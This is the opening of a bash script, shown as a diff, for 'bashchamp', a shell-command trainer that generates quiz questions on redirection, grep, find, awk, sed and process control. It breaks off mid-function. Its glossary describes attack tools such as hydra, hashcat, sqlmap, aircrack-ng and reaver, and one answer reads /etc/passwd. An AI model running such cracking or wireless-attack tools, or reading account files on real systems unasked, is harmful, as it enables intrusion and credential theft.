@@ -1,0 +1,1317 @@
+#!/usr/bin/env bash
+# bashchamp - CLI command trainer with dynamic question generation
+set -uo pipefail
+[[ ${BASH_VERSINFO[0]:-0} -lt 4 || (${BASH_VERSINFO[0]} -eq 4 && ${BASH_VERSINFO[1]:-0} -lt 3) ]] && { echo "Requires bash 4.3+"; exit 1; }
+_tty() { [[ -t 0 ]] || { echo "Error: requires interactive terminal" >&2; exit 1; }; }
+
+DATA="${XDG_DATA_HOME:-$HOME/.local/share}/bashchamp"; mkdir -p "$DATA"; touch "$DATA/scores"
+trap 'echo; exit 0' INT
+R=$'\e[31m' G=$'\e[32m' Y=$'\e[33m' C=$'\e[36m' D=$'\e[2m' B=$'\e[1m' N=$'\e[0m'
+PROMPT_CHAR="${CMD_PROMPT:-$([[ $EUID -eq 0 ]] && echo '# ' || echo '$ ')}"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# VARIABLE POOLS - Makes every session feel different
+# ═══════════════════════════════════════════════════════════════════════════════
+declare -a LOGS=(server.log app.log system.log auth.log access.log error.log debug.log nginx.log apache.log syslog)
+declare -a CONFIGS=(config.ini settings.conf app.yaml server.conf nginx.conf httpd.conf my.cnf pg.conf)
+declare -a SCRIPTS=(backup.sh deploy.sh build.sh test.sh cleanup.sh migrate.sh sync.sh init.sh)
+declare -a TXTS=(data.txt notes.txt output.txt report.txt dump.txt results.txt temp.txt)
+declare -a CSVS=(data.csv users.csv logs.csv export.csv report.csv stats.csv)
+declare -a BINS=(binary.exe program.elf app.bin firmware.bin malware.exe sample.bin)
+declare -a IMGS=(disk.img backup.img system.img evidence.img)
+declare -a PCAPS=(capture.pcap traffic.pcap network.pcap dump.pcap)
+declare -a HASHES=(hash.txt hashes.txt md5.txt sha256.txt passwd.txt shadow.txt)
+declare -a WORDLISTS=(wordlist.txt rockyou.txt passwords.txt dict.txt)
+declare -a ARCHIVES=(backup.tar.gz archive.tar.gz files.tgz data.tar.bz2 export.zip)
+declare -a PHOTOS=(photo.jpg image.png screenshot.png evidence.jpg document.pdf)
+declare -a DIRS=(src lib bin tmp logs data config backup output cache)
+declare -a EXTS=(py js ts go rs c cpp java rb sh log txt conf yaml json)
+declare -a SEARCH_TERMS=(error warning panic fatal timeout exception failed invalid denied refused connection)
+declare -a USERNAMES=(admin root user guest test deploy www-data nginx postgres mysql)
+declare -a IPS=(10.0.0.1 10.0.0.5 10.10.10.10 192.168.1.1 192.168.1.100 172.16.0.1 10.0.0.50)
+declare -a SUBNETS=(10.0.0.0/24 192.168.1.0/24 172.16.0.0/16 10.10.10.0/24)
+declare -a PORTS=(22 80 443 8080 3000 5000 8000 3306 5432 6379 27017)
+declare -a MACS=(AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 DE:AD:BE:EF:CA:FE)
+declare -a URLS=(http://10.0.0.1 http://192.168.1.100 http://target.local http://10.10.10.10)
+declare -a FIELDS=(name id status email timestamp user_id created_at value count type)
+declare -a JSON_KEYS=(data items results users records entries)
+declare -a REPLACE_OLD=(foo old debug localhost http TODO FIXME tmp)
+declare -a REPLACE_NEW=(bar new prod 10.0.0.1 https DONE RESOLVED cache)
+declare -a SIZES=(10M 50M 100M 500M 1G)
+declare -a TIMES=(60 30 120 1440)  # minutes
+declare -a NUMBERS=(5 10 15 20 25 50 100)
+declare -a COLUMNS=(1 2 3 4 5)
+declare -a DELIMS=(',' ':' '\t' '|' ';')
+declare -a HASHCAT_MODES=(0 100 1400 1800 3200)  # MD5, SHA1, SHA256, SHA512, bcrypt
+declare -a HASH_NAMES=(MD5 SHA1 SHA256 SHA512 bcrypt)
+declare -a INTERFACES=(eth0 wlan0 ens33 enp0s3)
+declare -a REMOTE_HOSTS=(server backup-host db-server web-server jump-host bastion)
+
+# Random selection helper
+_pick() { local -n arr=$1; echo "${arr[$((RANDOM % ${#arr[@]}))]}" ; }
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# COMMAND EXPLANATIONS (shown on TAB)
+# ═══════════════════════════════════════════════════════════════════════════════
+declare -A EXP=(
+  [echo]="print text to stdout" [cat]="concatenate and display file contents" [ls]="list directory contents"
+  [cd]="change directory" [cp]="copy files" [mv]="move/rename files" [rm]="remove files (no undo)"
+  [mkdir]="create directory" [touch]="create file/update timestamp" [head]="first N lines" [tail]="last N lines"
+  [grep]="search text (regex)" [find]="find files by name/size/date" [wc]="count lines/words/bytes"
+  [sort]="sort lines" [uniq]="filter duplicates" [cut]="extract columns" [tr]="translate chars"
+  [diff]="compare files" [tar]="archive tool" [tee]="copy stdin to file AND stdout" [xargs]="build commands from stdin"
+  [chmod]="change permissions" [kill]="signal process" [jobs]="list background jobs" [fg]="foreground job"
+  [bg]="background job" [sleep]="pause N seconds" [make]="build tool" [gcc]="C compiler"
+  [date]="show/set date" [du]="disk usage" [ps]="list processes" [mount]="attach filesystem"
+  [dd]="low-level copy" [strings]="extract text from binary" [base64]="encode/decode base64"
+  [rg]="ripgrep: fast grep" [fd]="fast find" [eza]="modern ls" [bat]="cat with highlighting"
+  [sd]="simple sed" [dust]="visual du" [tree]="directory tree" [sed]="stream editor" [xxd]="hex dump"
+  [md5sum]="MD5 hash (weak)" [sha256sum]="SHA256 hash" [nmap]="port scanner" [hydra]="password cracker"
+  [hashcat]="GPU hash cracker" [john]="John the Ripper" [tshark]="terminal wireshark" [nikto]="web scanner"
+  [sqlmap]="SQL injection" [masscan]="fast port scanner" [airmon-ng]="WiFi monitor mode"
+  [airodump-ng]="capture 802.11" [aireplay-ng]="inject packets" [aircrack-ng]="crack WPA/WEP"
+  [nc]="netcat" [smbclient]="SMB client" [lynis]="security audit" [binwalk]="firmware analysis"
+  [foremost]="file recovery" [fls]="list disk image" [exiftool]="file metadata" [readelf]="ELF info"
+  [r2]="radare2 RE framework" [volatility3]="memory forensics" [mactime]="filesystem timeline"
+  [feroxbuster]="dir enumeration" [proxychains]="proxy traffic" [procs]="modern ps"
+  [awk]="pattern scanning & processing" [jq]="JSON processor" [curl]="transfer data (HTTP/FTP)"
+  [ssh]="secure shell" [scp]="secure copy" [rsync]="fast incremental transfer"
+  [zip2john]="extract hash from zip" [pdf2john]="extract hash from pdf" [rar2john]="extract hash from rar"
+  [openssl]="crypto toolkit" [socat]="multipurpose relay" [tmux]="terminal multiplexer"
+  [ln]="create links" [readlink]="show link target" [pgrep]="find process by name" [pkill]="kill by name"
+  [pidof]="get PID by name" [pstree]="process tree" [ip]="network config" [ss]="socket statistics"
+  [lsof]="list open files" [systemctl]="systemd control" [journalctl]="systemd logs"
+  [wget]="download files" [unlink]="remove link"
+  ['$$']="current shell PID" ['$?']="last exit code" ['$!']="last background PID"
+  ['$#']="argument count" ['$@']="all arguments" ['$0']="script name"
+  ['!!']="repeat last command" ['!$']="last arg of prev cmd" ['!^']="first arg of prev cmd" ['!*']="all args of prev cmd"
+  ['>']="redirect to file" ['>>']="append to file" ['2>']="redirect stderr" ['&>']="redirect all"
+  ['2>&1']="stderr to stdout" ['<']="read from file" ['<<<']="here-string" ['|']="pipe"
+  ['|&']="pipe stdout+stderr" ['&&']="run if success" ['||']="run if fail" ['&']="run in background"
+  # Parameter expansion
+  ['${#var}']="string length" ['${var:-}']="default if unset" ['${var:=}']="set if unset"
+  ['${var:?}']="error if unset" ['${var:+}']="alt if set" ['${var#}']="remove prefix (short)"
+  ['${var##}']="remove prefix (long)" ['${var%}']="remove suffix (short)" ['${var%%}']="remove suffix (long)"
+  ['${var/}']="replace first" ['${var//}']="replace all" ['${var:n}']="substring from n"
+  ['${var:n:m}']="substring n to m" ['${var,,}']="lowercase" ['${var^^}']="uppercase"
+  # Arrays
+  [declare]="declare variable type" [mapfile]="read lines into array" [readarray]="read lines into array"
+  ['${arr[@]}']="all array elements" ['${#arr[@]}']="array length" ['${!arr[@]}']="array indices"
+  # Control flow
+  [if]="conditional execution" [then]="if body start" [else]="if alternative" [elif]="else if"
+  [fi]="end if" [for]="loop over items" [while]="loop while true" [until]="loop until true"
+  [do]="loop body start" [done]="end loop" [case]="pattern matching" [esac]="end case"
+  [function]="define function" [local]="local variable" [return]="function return"
+  [trap]="handle signals" [set]="shell options" [shopt]="bash options"
+  # Advanced tools
+  [strace]="trace syscalls" [ltrace]="trace library calls" [watch]="run command repeatedly"
+  [inotifywait]="watch filesystem events" [parallel]="run jobs in parallel" [flock]="file locking"
+  [timeout]="limit command runtime" [chroot]="change root dir" [fsck]="filesystem check"
+  [cryptsetup]="LUKS encryption" [iptables]="IPv4 firewall" [nftables]="netfilter firewall"
+  [shred]="secure file delete" [smartctl]="disk SMART info" [gcore]="dump process memory"
+  [coproc]="coprocess (bidirectional pipe)" [mkfifo]="create named pipe" [fuser]="find process using file"
+  [renice]="change process priority" [cgcreate]="create cgroup" [cgexec]="run in cgroup"
+  [enum4linux]="SMB enumeration" [gobuster]="dir/DNS enumeration" [wash]="WPS scanner"
+  [reaver]="WPS attack tool" [chkrootkit]="rootkit checker" [rkhunter]="rootkit hunter"
+  ['-r']="recursive" ['-i']="case insensitive" ['-v']="invert/verbose" ['-l']="long/list files"
+  ['-n']="line numbers" ['-c']="count" ['-q']="quiet" ['-f']="follow/force" ['-p']="create parents"
+  ['-e']="extension" ['-t']="type" ['-x']="execute" ['-h']="human readable" ['-s']="size/silent"
+  ['-a']="all/hidden" ['-u']="unique" ['-k']="key/column" ['-d']="delimiter" ['-o']="output" ['-w']="write"
+  ['-A']="aggressive scan" ['-O']="OS detection" ['-sV']="version detection" ['-sC']="default scripts"
+  ['-sU']="UDP scan" ['-sn']="ping scan" ['-sT']="TCP connect" ['-Pn']="skip ping" ['-F']="fast mode"
+  ['-p-']="all ports" ['-m']="hash type" ['--show']="show cracked" ['--wordlist']="dictionary file"
+  ['-E']="entropy/extended regex" ['-Y']="display filter" ['-T']="tree/fields"
+  ['{}']="filename placeholder" ['\;']="end -exec" ['-exec']="run on each" ['-delete']="delete matches"
+  ['-name']="match filename" ['-size']="match size" ['-type']="match type" ['-mmin']="match time" ['-path']="match path" ['-not']="negate"
+  ['-P']="parallel jobs" ['-0']="null delimiter" ['-I']="replace string" ['NR']="awk line number"
+  ['NF']="awk field count" ['$1']="first field" ['$NF']="last field" ['FS']="field separator"
+  ['-L']="follow symlinks/local forward" ['-R']="remote forward" ['-D']="dynamic SOCKS proxy" ['-J']="jump host"
+  ['-N']="no remote command" ['-f']="background ssh" ['-oN']="normal output" ['-oG']="greppable output" ['-oA']="all output formats"
+)
+explain() {
+  local tok n=0
+  for tok in $1; do [[ -n "${EXP[$tok]:-}" ]] && { echo -e "${D}  ${C}${tok}${D} → ${EXP[$tok]}${N}"; ((++n)); }; done
+  EXPLAIN_LINES=$n
+}
+
+# Vi mode: env > saved > ask
+VI_PREF="$DATA/vi_mode"
+if [[ -n "${CMD_VI:-}" ]]; then VI_MODE=$CMD_VI
+elif [[ -f "$VI_PREF" ]]; then VI_MODE=$(<"$VI_PREF")
+else read -rp "Enable vi keybindings? [y/N] " yn; [[ "$yn" =~ ^[Yy] ]] && VI_MODE=1 || VI_MODE=0; echo "$VI_MODE" > "$VI_PREF"; fi
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# QUESTION GENERATORS - Dynamic questions with infinite variations
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# Level 0: Shell Fundamentals (redirections, pipes, job control, history, variables, expansion)
+gen_q0() {
+  local questions=()
+  local log=$(_pick LOGS) log2=$(_pick LOGS) cfg=$(_pick CONFIGS) script=$(_pick SCRIPTS)
+  local txt=$(_pick TXTS) txt2=$(_pick TXTS) csv=$(_pick CSVS) dir=$(_pick DIRS)
+  local term=$(_pick SEARCH_TERMS) term2=$(_pick SEARCH_TERMS) archive=$(_pick ARCHIVES)
+
+  # Redirections - essential shell plumbing
+  questions+=("Save ls output to files.txt|ls > files.txt")
+  questions+=("Append \"done\" to ${log}|echo \"done\" >> ${log}")
+  questions+=("Save make errors to errors.log|make 2> errors.log")
+  questions+=("Save make stdout+stderr to build.log|make &> build.log|make > build.log 2>&1")
+  questions+=("Send gcc errors to stdout for piping|gcc main.c 2>&1")
+  questions+=("Run ${script} silently (discard all output)|./${script} &> /dev/null|./${script} > /dev/null 2>&1")
+  questions+=("Find *.conf files in /, suppress permission errors|find / -name \"*.conf\" 2> /dev/null")
+  questions+=("Count lines in ${csv} via stdin|wc -l < ${csv}")
+  questions+=("Uppercase \"hello\" using here string|tr a-z A-Z <<< \"hello\"")
+
+  # Pipes and logic - chaining commands
+  questions+=("Search for ${term} in ${log}|grep ${term} ${log}|cat ${log} | grep ${term}")
+  questions+=("Build and capture all output to build.log|make |& tee build.log")
+  questions+=("Create ${dir} and cd into it (fail if exists)|mkdir ${dir} && cd ${dir}")
+  questions+=("Create ${dir} and cd into it (create parents if needed)|mkdir -p ${dir} && cd ${dir}")
+  questions+=("True if '${term}' NOT found in ${log}|! grep -q ${term} ${log}")
+  questions+=("Run cmd1, then cmd2 only if cmd1 fails|cmd1 || cmd2")
+
+  # Job control - background processes
+  questions+=("Run sleep 60 in background|sleep 60 &")
+  questions+=("List background jobs|jobs")
+  questions+=("Bring job 1 to foreground|fg %1")
+  questions+=("Send job 1 to background|bg %1")
+  questions+=("Kill job 1|kill %1")
+  questions+=("Kill job 2 with SIGKILL|kill -9 %2")
+
+  # Command substitution
+  questions+=("Store current date in variable 'now'|now=\$(date)")
+  questions+=("Print today's date inline with text|echo \"Today is \$(date +%Y-%m-%d)\"")
+  questions+=("Store line count of ${txt} in variable|lines=\$(wc -l < ${txt})")
+
+  # Subshell and grouping
+  questions+=("Extract ${archive} in /tmp without changing current dir|(cd /tmp && tar xzf ${archive})")
+  questions+=("Run multiple commands in current shell (grouped)|{ echo start; sleep 1; echo end; }")
+
+  # History - command recall
+  questions+=("Repeat last command|!!")
+  questions+=("Run last command starting with 'git'|!git")
+  questions+=("Run command number 42 from history|!42")
+  questions+=("Replace foo with bar in last command and run|^foo^bar")
+  questions+=("Reuse last argument of previous command|!\$")
+  questions+=("Reuse first argument of previous command|!^")
+  questions+=("Reuse all arguments of previous command|!*")
+
+  # Special variables - essential for scripting
+  questions+=("Print current shell PID|echo \$\$")
+  questions+=("Print exit status of last command|echo \$?")
+  questions+=("Print PID of last background process|echo \$!")
+  questions+=("Print number of script arguments|echo \$#")
+  questions+=("Print all script arguments (preserves quoting)|echo \"\$@\"")
+  questions+=("Print script name|echo \$0")
+
+  # Brace expansion - time saver
+  questions+=("Create a.txt b.txt c.txt with one command|touch {a,b,c}.txt")
+  questions+=("Create file1 through file10|touch file{1..10}")
+  questions+=("Backup ${cfg} to ${cfg}.bak using brace expansion|cp ${cfg}{,.bak}")
+  questions+=("Diff ${txt%.txt}.old vs ${txt%.txt}.new|diff ${txt%.txt}.{old,new}")
+  questions+=("Create nested dirs: project/{src,lib,bin}|mkdir -p project/{src,lib,bin}")
+
+  # Process substitution - advanced piping
+  questions+=("Diff sorted contents of ${txt} and ${txt2}|diff <(sort ${txt}) <(sort ${txt2})")
+
+  # Bash test operators (essential for scripting)
+  questions+=("Test if ${txt} exists and is a file|[[ -f ${txt} ]]")
+  questions+=("Test if ${dir} exists and is a directory|[[ -d ${dir} ]]")
+  questions+=("Test if ${txt} is readable|[[ -r ${txt} ]]")
+  questions+=("Test if ${script} is executable|[[ -x ${script} ]]")
+  questions+=("Test if variable is empty|[[ -z \"\$var\" ]]")
+  questions+=("Test if variable is NOT empty|[[ -n \"\$var\" ]]")
+  questions+=("Test if two strings are equal|[[ \"\$a\" == \"\$b\" ]]")
+  questions+=("Test if number is greater than 10|[[ \$num -gt 10 ]]")
+  questions+=("Test if file1 is newer than file2|[[ file1 -nt file2 ]]")
+  questions+=("Combine tests with AND|[[ -f ${txt} && -r ${txt} ]]")
+  questions+=("Combine tests with OR|[[ -f ${txt} || -f ${cfg} ]]")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 1: Core File Tools (cat, ls, head, tail, cp, wc, du, tree)
+gen_q1() {
+  local questions=()
+  local cfg=$(_pick CONFIGS) log=$(_pick LOGS) txt=$(_pick TXTS) csv=$(_pick CSVS)
+  local dir=$(_pick DIRS) n1=$(_pick NUMBERS) n2=$(_pick NUMBERS)
+  local archive=$(_pick ARCHIVES) script=$(_pick SCRIPTS)
+
+  # Viewing files
+  questions+=("View ${cfg} contents|cat ${cfg}|bat ${cfg}")
+  questions+=("Display ${log} with line numbers|cat -n ${log}|bat -n ${log}")
+  questions+=("Show non-printing characters in ${txt}|cat -A ${txt}")
+
+  # Listing files
+  questions+=("List files with size, permissions, dates|ls -l|eza -l")
+  questions+=("List all files including hidden|ls -la|eza -la")
+  questions+=("List files sorted by size (largest first)|ls -lS|eza -l --sort size -r")
+  questions+=("List files sorted by modification time (newest first)|ls -lt|eza -l --sort modified")
+  questions+=("List only directories|ls -d */|eza -D")
+  questions+=("Show directory tree|tree|eza -T")
+  questions+=("Show tree 2 levels deep|tree -L 2|eza -T -L 2")
+
+  # Head and tail
+  questions+=("First ${n1} lines of ${log}|head -n ${n1} ${log}|head -${n1} ${log}")
+  questions+=("Last ${n2} lines of ${log}|tail -n ${n2} ${log}|tail -${n2} ${log}")
+  questions+=("Follow ${log} in realtime (live updates)|tail -f ${log}")
+  questions+=("Last ${n1} lines, then follow for new lines|tail -n ${n1} -f ${log}")
+  questions+=("Show all but last ${n1} lines of ${txt}|head -n -${n1} ${txt}")
+  questions+=("Show ${txt} starting from line $((n1+1))|tail -n +$((n1+1)) ${txt}")
+
+  # File operations
+  questions+=("Count lines in ${csv}|wc -l ${csv}")
+  questions+=("Count words in ${txt}|wc -w ${txt}")
+  questions+=("Count bytes in ${txt}|wc -c ${txt}")
+  questions+=("Copy ${cfg} to backup.conf|cp ${cfg} backup.conf")
+  questions+=("Copy ${dir}/ recursively to backup/|cp -r ${dir}/ backup/")
+
+  # Disk usage
+  questions+=("Show disk usage of current dir (human readable)|du -sh .|dust")
+  questions+=("Show disk usage of each subdir|du -sh */|dust -d 1")
+  questions+=("Find what's using space in ${dir}/|du -sh ${dir}/*|dust ${dir}/")
+
+  # Archives (tar)
+  questions+=("Extract ${archive}|tar xzf ${archive}|tar xf ${archive}")
+  questions+=("Extract ${archive} to ${dir}/|tar xzf ${archive} -C ${dir}/")
+  questions+=("Create archive.tar.gz from ${dir}/|tar czf archive.tar.gz ${dir}/")
+  questions+=("List contents of ${archive} without extracting|tar tzf ${archive}|tar tf ${archive}")
+  questions+=("Extract specific file from ${archive}|tar xzf ${archive} path/to/file")
+
+  # Symlinks
+  questions+=("Create symlink 'link' pointing to ${cfg}|ln -s ${cfg} link")
+  questions+=("Create symlink with absolute path|ln -s \$(pwd)/${cfg} link")
+  questions+=("Show where symlink points|readlink link|ls -l link")
+  questions+=("Remove symlink (not target)|rm link|unlink link")
+
+  # Permissions
+  questions+=("Make ${script} executable|chmod +x ${script}")
+  questions+=("Set ${script} to rwxr-xr-x (755)|chmod 755 ${script}")
+  questions+=("Set ${cfg} to rw-r--r-- (644)|chmod 644 ${cfg}")
+  questions+=("Add write permission for group|chmod g+w ${cfg}")
+  questions+=("Remove all permissions for others|chmod o-rwx ${cfg}")
+  questions+=("Make ${dir}/ and contents readable by all|chmod -R a+r ${dir}/")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 2: Text Search (grep, rg)
+gen_q2() {
+  local questions=()
+  local log=$(_pick LOGS) txt=$(_pick TXTS) term=$(_pick SEARCH_TERMS) term2=$(_pick SEARCH_TERMS)
+  local ext=$(_pick EXTS) n=$(_pick NUMBERS)
+
+  # Basic grep
+  questions+=("Search for '${term}' recursively in current dir|grep -r ${term}|rg ${term}")
+  questions+=("Case-insensitive search for '${term}'|grep -ri ${term}|rg -i ${term}")
+  questions+=("Search '${term}' with line numbers|grep -rn ${term}|rg -n ${term}")
+  questions+=("Count '${term}' matches in ${log}|grep -c ${term} ${log}|rg -c ${term} ${log}")
+  questions+=("Search '${term}' with ${n} lines context|grep -C ${n} ${term}|rg -C ${n} ${term}")
+
+  # Filtering
+  questions+=("List only filenames containing '${term}'|grep -rl ${term}|rg -l ${term}")
+  questions+=("Lines WITHOUT '${term}' in ${log}|grep -v ${term} ${log}|rg -v ${term} ${log}")
+  questions+=("Search '${term}' in .${ext} files only|grep -r --include='*.${ext}' ${term}|rg -t ${ext} ${term}")
+  questions+=("Search '${term}' excluding .git directory|grep -r --exclude-dir=.git ${term}|rg ${term} -g '!.git'")
+
+  # Regex patterns
+  questions+=("Find lines starting with '${term}'|grep -r '^${term}'|rg '^${term}'")
+  questions+=("Find lines ending with '${term}'|grep -r '${term}\$'|rg '${term}\$'")
+  questions+=("Find phone pattern XXX-XXX-XXXX|grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}'|rg '\\d{3}-\\d{3}-\\d{4}'")
+  questions+=("Find IP addresses in ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log}|rg -o '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log}")
+  questions+=("Find email addresses|grep -rE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}'|rg '[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}'")
+
+  # Literal search
+  questions+=("Literal search 'func()' (no regex)|grep -F 'func()' ${txt}|rg -F 'func()' ${txt}")
+  questions+=("Search for literal '[ERROR]' in ${log}|grep -F '[ERROR]' ${log}|rg -F '[ERROR]' ${log}")
+
+  # Word boundaries
+  questions+=("Match whole word '${term}' only|grep -rw ${term}|rg -w ${term}")
+
+  # Multiple patterns
+  questions+=("Find lines with '${term}' OR '${term2}'|grep -rE '${term}|${term2}'|rg '${term}|${term2}'")
+  questions+=("Find lines with both '${term}' AND '${term2}'|grep -r ${term} | grep ${term2}|rg ${term} | rg ${term2}")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 3: File Finding (find, fd)
+gen_q3() {
+  local questions=()
+  local ext=$(_pick EXTS) ext2=$(_pick EXTS) dir=$(_pick DIRS) size=$(_pick SIZES)
+  local time=$(_pick TIMES) term=$(_pick SEARCH_TERMS)
+
+  # By name
+  questions+=("Find all .${ext} files|find . -name '*.${ext}'|fd -e ${ext}")
+  questions+=("Find files named exactly 'config'|find . -name 'config'|fd -g 'config'")
+  questions+=("Find 'config' files (case-insensitive)|find . -iname '*config*'|fd -i config")
+  questions+=("Find files matching '*test*' pattern|find . -name '*test*'|fd test")
+
+  # By size
+  questions+=("Find files larger than ${size}|find . -size +${size}|fd -S +${size}")
+  questions+=("Find files smaller than ${size}|find . -size -${size}|fd -S -${size}")
+  questions+=("Find empty files|find . -type f -empty|fd -t e -t f")
+
+  # By time
+  questions+=("Find files modified in last ${time} minutes|find . -mmin -${time}|fd --changed-within ${time}m")
+  questions+=("Find files NOT modified in last 7 days|find . -mtime +7|fd --changed-before 7d")
+  questions+=("Find files accessed in last hour|find . -amin -60|fd --changed-within 1h")
+
+  # By type
+  questions+=("Find directories only|find . -type d|fd -t d")
+  questions+=("Find regular files only|find . -type f|fd -t f")
+  questions+=("Find symlinks only|find . -type l|fd -t l")
+  questions+=("Find executable files|find . -type f -executable|fd -t x")
+
+  # Hidden and exclusions
+  questions+=("Find all files including hidden (fd excludes hidden by default)|fd -H")
+  questions+=("Find all, excluding .git directory|find . -not -path './.git/*'|fd -E .git")
+  questions+=("Find .${ext} files, excluding ${dir}/|find . -name '*.${ext}' -not -path './${dir}/*'|fd -e ${ext} -E ${dir}")
+  questions+=("Find files excluding multiple dirs|find . -not -path './node_modules/*' -not -path './.git/*'|fd -E node_modules -E .git")
+
+  # Path matching
+  questions+=("Find files in paths matching */${dir}/*|find . -path '*/${dir}/*'|fd -p ${dir}/")
+  questions+=("Find test files in src directory|find . -path '*/src/*' -name '*test*'|fd -p 'src/.*test'")
+
+  # Max depth
+  questions+=("Find .${ext} files, max 2 levels deep|find . -maxdepth 2 -name '*.${ext}'|fd -e ${ext} -d 2")
+  questions+=("Find only in current dir (no recursion)|find . -maxdepth 1 -type f|fd -d 1 -t f")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 4: Sorting, Cutting, Piping (sort, uniq, cut, awk basics, pipes)
+gen_q4() {
+  local questions=()
+  local txt=$(_pick TXTS) csv=$(_pick CSVS) log=$(_pick LOGS)
+  local col=$(_pick COLUMNS) col2=$((col + 1)) delim=$(_pick DELIMS)
+  local n=$(_pick NUMBERS) field=$(_pick FIELDS) port=$(_pick PORTS)
+
+  # Sorting
+  questions+=("Sort ${txt} alphabetically|sort ${txt}")
+  questions+=("Sort ${txt} in reverse order|sort -r ${txt}")
+  questions+=("Sort ${txt} numerically|sort -n ${txt}")
+  questions+=("Sort ${txt} numerically, descending|sort -rn ${txt}")
+  questions+=("Sort and remove duplicates|sort -u ${txt}")
+  questions+=("Sort ${csv} by column ${col}|sort -t',' -k${col} ${csv}")
+  questions+=("Sort ${csv} by column ${col} numerically|sort -t',' -k${col}n ${csv}")
+  questions+=("Sort by human-readable sizes (1K, 2M, 3G)|sort -h")
+
+  # Uniqueness
+  questions+=("Remove adjacent duplicate lines|uniq ${txt}")
+  questions+=("Count occurrences of each unique line|sort ${txt} | uniq -c")
+  questions+=("Show only duplicate lines|sort ${txt} | uniq -d")
+  questions+=("Show only unique lines (appear once)|sort ${txt} | uniq -u")
+  questions+=("Count unique lines in ${txt}|sort ${txt} | uniq | wc -l")
+
+  # Cutting columns
+  questions+=("Extract column ${col} from ${csv} (comma-delimited)|cut -d',' -f${col} ${csv}")
+  questions+=("Extract columns ${col} and ${col2} from ${csv}|cut -d',' -f${col},${col2} ${csv}")
+  questions+=("Extract first ${n} characters of each line|cut -c1-${n} ${txt}")
+  questions+=("Extract from character ${n} to end of line|cut -c${n}- ${txt}")
+  questions+=("Extract column ${col} from colon-separated file|cut -d':' -f${col} /etc/passwd")
+
+  # Basic awk
+  questions+=("Print first column of ${txt}|awk '{print \$1}' ${txt}")
+  questions+=("Print last column of each line|awk '{print \$NF}' ${txt}")
+  questions+=("Print columns 1 and 3|awk '{print \$1, \$3}' ${txt}")
+  questions+=("Print lines longer than ${n} chars|awk 'length > ${n}' ${txt}")
+  questions+=("Print line numbers with content|awk '{print NR, \$0}' ${txt}")
+  questions+=("Sum numbers in column ${col} of ${csv}|awk -F',' '{sum+=\$${col}} END {print sum}' ${csv}")
+  questions+=("Print lines where column ${col} > ${n}|awk -F',' '\$${col} > ${n}' ${csv}")
+
+  # Field manipulation
+  questions+=("Replace spaces with tabs|tr ' ' '\\t' < ${txt}")
+  questions+=("Delete all digits from ${txt}|tr -d '0-9' < ${txt}")
+  questions+=("Squeeze multiple spaces to single|tr -s ' ' < ${txt}")
+
+  # Useful pipes
+  questions+=("Top ${n} most common lines in ${log}|sort ${log} | uniq -c | sort -rn | head -${n}")
+  questions+=("Count unique values in column ${col}|cut -d',' -f${col} ${csv} | sort | uniq -c")
+  questions+=("Extract and count unique IPs from ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log} | sort | uniq -c | sort -rn")
+
+  # Process management
+  questions+=("List all processes|ps aux")
+  questions+=("Find processes matching 'python'|ps aux | grep python|pgrep -a python")
+  questions+=("Get PID of process by name|pgrep nginx|pidof nginx")
+  questions+=("Kill process by name|pkill nginx")
+  questions+=("Kill all processes matching pattern|pkill -f 'python script.py'")
+  questions+=("Show process tree|ps auxf|pstree")
+  questions+=("Find what's using port ${port}|ss -tlpn | grep ${port}|lsof -i :${port}")
+
+  # Modern network info (ip/ss replace ifconfig/netstat)
+  questions+=("Show IP addresses|ip addr|ip a")
+  questions+=("Show routing table|ip route|ip r")
+  questions+=("Show listening ports|ss -tlpn")
+  questions+=("Show all TCP connections|ss -ta")
+  questions+=("Show UDP listeners|ss -ulpn")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 7: Batch Operations (find -exec, fd -x, sed, xargs)
+gen_q7_batch() {
+  local questions=()
+  local ext=$(_pick EXTS) ext2=$(_pick EXTS) log=$(_pick LOGS) txt=$(_pick TXTS)
+  local cfg=$(_pick CONFIGS) old=$(_pick REPLACE_OLD) new=$(_pick REPLACE_NEW)
+  local term=$(_pick SEARCH_TERMS) size=$(_pick SIZES) n=$(_pick NUMBERS)
+
+  # find -exec
+  questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
+  questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
+  questions+=("Delete all .tmp files|find . -name '*.tmp' -delete|fd -e tmp -x rm {}")
+  questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
+  questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
+  questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
+  questions+=("Copy all .${ext} files to backup/|find . -name '*.${ext}' -exec cp {} backup/ \\;|fd -e ${ext} -x cp {} backup/")
+
+  # Batch with + (more efficient)
+  questions+=("List all .${ext} files in one ls call|find . -name '*.${ext}' -exec ls -l {} +")
+  questions+=("Count total lines across all .${ext} files|find . -name '*.${ext}' -exec wc -l {} + | tail -1")
+
+  # sed replacement
+  questions+=("Replace '${old}' with '${new}' in ${cfg}|sed -i 's/${old}/${new}/g' ${cfg}|sd '${old}' '${new}' ${cfg}")
+  questions+=("Replace '${old}' with '${new}' (first occurrence only)|sed -i 's/${old}/${new}/' ${cfg}")
+  questions+=("Delete lines containing '${term}' in ${log}|sed -i '/${term}/d' ${log}")
